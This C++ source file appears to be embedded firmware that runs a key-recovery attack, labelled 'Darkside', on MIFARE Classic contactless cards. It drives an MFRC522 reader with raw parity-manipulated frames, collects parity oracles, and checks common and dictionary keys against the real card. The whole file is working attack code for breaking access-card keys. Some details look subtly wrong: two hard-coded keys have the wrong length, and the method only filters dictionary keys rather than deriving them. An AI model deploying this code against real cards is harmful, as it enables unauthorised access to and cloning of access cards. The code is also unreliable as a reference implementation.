#include "DarksideAttack.h"

extern "C" {
#include "utils/crypto/crapto1.h"
}

#include <cstring>

// ===================== Low-level helpers =====================

static uint8_t oddparity(uint8_t bt)
{
  return (0x9669 >> ((bt ^ (bt >> 4)) & 0xF)) & 1;
}

// ISO14443-3 CRC-A
static void calcCRC(const uint8_t* data, uint8_t len, uint8_t* crc)
{
  uint32_t wCrc = 0x6363;
  for (uint8_t i = 0; i < len; i++) {
    uint8_t bt = data[i];
    bt = (bt ^ (uint8_t)(wCrc & 0xFF));
    bt = (bt ^ (bt << 4));
    wCrc = (wCrc >> 8) ^ ((uint32_t)bt << 8) ^ ((uint32_t)bt << 3) ^ ((uint32_t)bt >> 4);
  }
  crc[0] = (uint8_t)(wCrc & 0xFF);
  crc[1] = (uint8_t)((wCrc >> 8) & 0xFF);
}

// ===================== Raw frame encoding =====================

static uint8_t makeRawFrame(uint8_t* data, uint8_t dataLen, uint8_t* parBits, uint8_t* pkt)
{
  pkt[0] = data[0];
  pkt[1] = (parBits[0] | (data[1] << 1));
  int i;
  for (i = 2; i < dataLen; i++) {
    pkt[i]  = (parBits[i - 1] << (i - 1)) | (data[i - 1] >> (9 - i));
    pkt[i] |= (data[i] << i);
  }
  pkt[dataLen] = (parBits[dataLen - 1] << (i - 1)) | (data[dataLen - 1] >> (9 - i));
  return dataLen % 8;
}

static void extractData(uint8_t* pkt, uint8_t len, uint8_t* parBits, uint8_t* data)
{
  data[0] = pkt[0];
  int i;
  for (i = 1; i < len - 1; i++) {
    parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
    data[i] = (pkt[i] >> i) | (pkt[i + 1] << (8 - i));
  }
  parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
}

// ===================== MFRC522 register-level IO =====================

static void parityOff(MFRC522_I2C* m)
{
  m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x10);
}

static void parityOn(MFRC522_I2C* m)
{
  m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x00);
}

static void resetPICC(MFRC522_I2C* m)
{
  m->PCD_AntennaOff();
  delay(10);
  m->PCD_AntennaOn();
  delay(10);
}

static bool initCom(MFRC522_I2C* m)
{
  for (int attempt = 0; attempt < 20; attempt++) {
    delay(10);
    uint8_t buf[2];
    uint8_t bufSize = sizeof(buf);
    if (m->PICC_RequestA(buf, &bufSize) != MFRC522_I2C::STATUS_OK) continue;
    if (m->PICC_Select(&m->uid) != MFRC522_I2C::STATUS_OK) continue;
    return true;
  }
  return false;
}

static bool piccIO(MFRC522_I2C* m, uint8_t cmd, uint8_t sendLen,
                   uint8_t* data, uint8_t bufLen, uint8_t validBits = 0)
{
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, MFRC522_I2C::PCD_Idle);
  m->PCD_WriteRegister(MFRC522_I2C::ComIrqReg, 0x7F);
  m->PCD_WriteRegister(MFRC522_I2C::FIFOLevelReg, 0x80);
  m->PCD_WriteRegister(MFRC522_I2C::FIFODataReg, sendLen, data);
  m->PCD_WriteRegister(MFRC522_I2C::BitFramingReg, validBits);
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, cmd);

  if (cmd == MFRC522_I2C::PCD_Transceive)
    m->PCD_SetRegisterBitMask(MFRC522_I2C::BitFramingReg, 0x80);

  uint8_t finishFlag = (cmd == MFRC522_I2C::PCD_Transceive ||
                        cmd == MFRC522_I2C::PCD_Receive) ? 0x30 : 0x10;

  for (int wd = 3000; wd > 0; --wd) {
    uint8_t irq = m->PCD_ReadRegister(MFRC522_I2C::ComIrqReg);
    if (irq & finishFlag) break;
    if (irq & 0x01 || wd == 1) return false;
  }

  uint8_t err = m->PCD_ReadRegister(MFRC522_I2C::ErrorReg);
  if (err & 0x11) return false;

  if (cmd == MFRC522_I2C::PCD_Transceive || cmd == MFRC522_I2C::PCD_Receive) {
    uint8_t n = m->PCD_ReadRegister(MFRC522_I2C::FIFOLevelReg);
    if (n > bufLen) return false;
    m->PCD_ReadRegister(MFRC522_I2C::FIFODataReg, n, data);
  }
  return true;
}

// ===================== Darkside oracle data =====================

struct DarksideOracle {
  uint32_t nt;
  uint8_t par[4];  // parity bits we sent when NACK received (for nr bytes)
};

static constexpr int MAX_ORACLES = 4;

/**
 * Collect darkside oracle data by sending auth with various parity guesses.
 * When the tag responds with NACK, we know our parity matched the keystream.
 */
static int collectOracles(MFRC522_I2C* module, uint8_t authCmd, uint8_t blockAddr,
                          DarksideOracle* oracles, int maxOracles,
                          DarksideAttack::ProgressFn progress)
{
  int collected = 0;

  for (int attempt = 0; attempt < maxOracles * 256 && collected < maxOracles; attempt++) {
    if (progress && (attempt % 32 == 0)) {
      char msg[48];
      snprintf(msg, sizeof(msg), "Collecting oracle %d/%d...", collected + 1, maxOracles);
      if (!progress(msg, 5 + collected * 15)) return collected;
    }

    parityOn(module);
    resetPICC(module);
    if (!initCom(module)) continue;
    parityOff(module);

    // Send AUTH command to get tag nonce
    uint8_t cmd[4];
    cmd[0] = authCmd;
    cmd[1] = blockAddr;
    calcCRC(cmd, 2, &cmd[2]);

    uint8_t cmdPar[4], pkt[9];
    for (int i = 0; i < 4; i++)
      cmdPar[i] = oddparity(cmd[i]);

    uint8_t vb = makeRawFrame(cmd, 4, cmdPar, pkt);
    if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb))
      continue;

    uint8_t rData[4], rPar[4];
    extractData(pkt, 5, rPar, rData);
    uint32_t nt = ((uint32_t)rData[0] << 24) | ((uint32_t)rData[1] << 16) |
                  ((uint32_t)rData[2] << 8) | rData[3];

    // Send {nr=0, ar=0} with random parity guess
    // Parity bits for 8 bytes (4 nr + 4 ar)
    uint8_t data[8] = {0};
    uint8_t par[8];

    // Use attempt number to iterate parity combinations for nr bytes
    uint8_t parGuess = (uint8_t)(attempt & 0xFF);
    for (int i = 0; i < 4; i++)
      par[i] = (parGuess >> i) & 1;
    // ar parity doesn't matter much, set to 0
    for (int i = 4; i < 8; i++)
      par[i] = 0;

    vb = makeRawFrame(data, 8, par, pkt);

    // Check if tag responds (NACK = parity was correct for nr bytes)
    if (piccIO(module, MFRC522_I2C::PCD_Transceive, 9, pkt, 9, vb)) {
      // Got response! Parity matched.
      oracles[collected].nt = nt;
      memcpy(oracles[collected].par, par, 4);
      collected++;
    }
  }

  return collected;
}

// ===================== Software key verification =====================

/**
 * Fast software check: does this key produce keystream consistent with
 * the darkside oracle data?
 */
static bool verifyKeyAgainstOracle(uint64_t key, uint32_t uid,
                                    const DarksideOracle* oracles, int oracleCount)
{
  for (int o = 0; o < oracleCount; o++) {
    Crypto1State* state = crypto1_create(key);
    crypto1_word(state, uid ^ oracles[o].nt, 0);

    bool match = true;
    for (int i = 0; i < 4 && match; i++) {
      uint8_t ks_byte = crypto1_byte(state, 0, 0);
      uint8_t ks_par = filter(state->odd);
      // Tag checks: par_sent ⊕ ks_par == oddparity(ks_byte)
      if ((oracles[o].par[i] ^ ks_par) != oddparity(ks_byte))
        match = false;
    }

    crypto1_destroy(state);
    if (!match) return false;
  }
  return true;
}

/**
 * Hardware verification against actual card.
 */
static bool verifyKeyOnCard(MFRC522_I2C* module, uint8_t authCmd, uint8_t blockAddr,
                             uint64_t candidateKey)
{
  MFRC522_I2C::MIFARE_Key mfKey;
  uint64_t k = candidateKey;
  for (int i = 5; i >= 0; i--) {
    mfKey.keyByte[i] = (uint8_t)(k & 0xFF);
    k >>= 8;
  }

  parityOn(module);
  resetPICC(module);
  if (!initCom(module)) return false;

  uint8_t status = module->PCD_Authenticate(authCmd, blockAddr, &mfKey, &module->uid);
  module->PCD_StopCrypto1();
  return (status == MFRC522_I2C::STATUS_OK);
}

// ===================== Key sources =====================

// Built-in common MIFARE keys
static const uint64_t COMMON_KEYS[] = {
  0xFFFFFFFFFFFFULL, 0xA0A1A2A3A4A5ULL, 0xB0B1B2B3B4B5ULL,
  0x000000000000ULL, 0xAABBCCDDEEFFULL, 0x4D3A99C351DDULL,
  0x1A982C7E459AULL, 0xD3F7D3F7D3F7ULL, 0x714C5C880592ULL,
  0xA0B0C0D0E0F0ULL, 0xA1B1C1D1E1F1ULL, 0xABCDEF123456ULL,
  0x010101010101ULL, 0x020202020202ULL, 0x030303030303ULL,
  0x040404040404ULL, 0x050505050505ULL, 0x060606060606ULL,
  0xFC00018C997BULL, 0x0A0B0C0D0E0FULL, 0x010203040506ULL,
  0x102030405060ULL, 0x112233445566ULL, 0xAAAAAAAAAAULL,
  0xBBBBBBBBBBBBULL, 0xCCCCCCCCCCCCULL, 0xDDDDDDDDDDDDULL,
  0xEEEEEEEEEEEEULL, 0x001122334455ULL, 0x6677889900AABBULL,
  0x48454C504D45ULL, 0x4A4F484E4E59ULL,
  0xA0478CC39018ULL, 0x587160189541ULL, 0x533CB6C723F6ULL,
  0x8FD0A4F256E9ULL,
  // Patterns: all-same-byte
  0x111111111111ULL, 0x222222222222ULL, 0x333333333333ULL,
  0x444444444444ULL, 0x555555555555ULL, 0x666666666666ULL,
  0x777777777777ULL, 0x888888888888ULL, 0x999999999999ULL,
};
static constexpr size_t COMMON_KEY_COUNT = sizeof(COMMON_KEYS) / sizeof(COMMON_KEYS[0]);

static bool parseHexKey(const String& line, uint64_t* outKey)
{
  String s = line;
  s.trim();
  if (s.length() == 0 || s.startsWith("#")) return false;
  s.replace(":", "");
  if (s.length() != 12) return false;

  uint64_t key = 0;
  for (int i = 0; i < 12; i++) {
    char c = s[i];
    uint8_t nibble;
    if (c >= '0' && c <= '9') nibble = c - '0';
    else if (c >= 'A' && c <= 'F') nibble = 10 + c - 'A';
    else if (c >= 'a' && c <= 'f') nibble = 10 + c - 'a';
    else return false;
    key = (key << 4) | nibble;
  }
  *outKey = key;
  return true;
}

// ===================== Main entry point =====================

DarksideAttack::Result DarksideAttack::crack(
    MFRC522_I2C* module, uint32_t uid,
    uint8_t authCmd, uint8_t blockAddr,
    IStorage* storage, ProgressFn progress)
{
  Result result;

  // Step 1: Collect darkside oracle data
  DarksideOracle oracles[MAX_ORACLES];
  int oracleCount = collectOracles(module, authCmd, blockAddr,
                                    oracles, MAX_ORACLES, progress);

  if (oracleCount == 0) {
    if (progress) progress("No oracle data collected", 100);
    return result;
  }

  // Step 2: Try built-in common keys via software simulation
  if (progress) {
    char msg[48];
    snprintf(msg, sizeof(msg), "Testing %d common keys...", (int)COMMON_KEY_COUNT);
    if (!progress(msg, 65)) return result;
  }

  for (size_t i = 0; i < COMMON_KEY_COUNT; i++) {
    if (verifyKeyAgainstOracle(COMMON_KEYS[i], uid, oracles, oracleCount)) {
      if (verifyKeyOnCard(module, authCmd, blockAddr, COMMON_KEYS[i])) {
        result.success = true;
        result.key = COMMON_KEYS[i];
        return result;
      }
    }
  }

  // Step 3: Try dictionary files from storage
  if (storage && storage->isAvailable()) {
    static constexpr const char* DICT_PATH = "/unigeek/nfc/dictionaries";
    static constexpr uint8_t MAX_FILES = 16;
    IStorage::DirEntry entries[MAX_FILES];
    uint8_t fileCount = storage->listDir(DICT_PATH, entries, MAX_FILES);

    for (uint8_t f = 0; f < fileCount; f++) {
      if (entries[f].isDir || !entries[f].name.endsWith(".txt")) continue;

      if (progress) {
        char msg[48];
        snprintf(msg, sizeof(msg), "Dict: %s", entries[f].name.c_str());
        if (!progress(msg, 70 + f * 20 / (fileCount ? fileCount : 1))) return result;
      }

      String filePath = String(DICT_PATH) + "/" + entries[f].name;
      String content = storage->readFile(filePath.c_str());

      int start = 0;
      while (start < (int)content.length()) {
        int nl = content.indexOf('\n', start);
        if (nl < 0) nl = content.length();
        String line = content.substring(start, nl);
        start = nl + 1;

        uint64_t key;
        if (!parseHexKey(line, &key)) continue;

        // Skip if already in common keys
        bool isCommon = false;
        for (size_t c = 0; c < COMMON_KEY_COUNT; c++) {
          if (COMMON_KEYS[c] == key) { isCommon = true; break; }
        }
        if (isCommon) continue;

        if (verifyKeyAgainstOracle(key, uid, oracles, oracleCount)) {
          if (verifyKeyOnCard(module, authCmd, blockAddr, key)) {
            result.success = true;
            result.key = key;
            return result;
          }
        }
      }
    }
  }

  if (progress) progress("No key found", 100);
  return result;
}
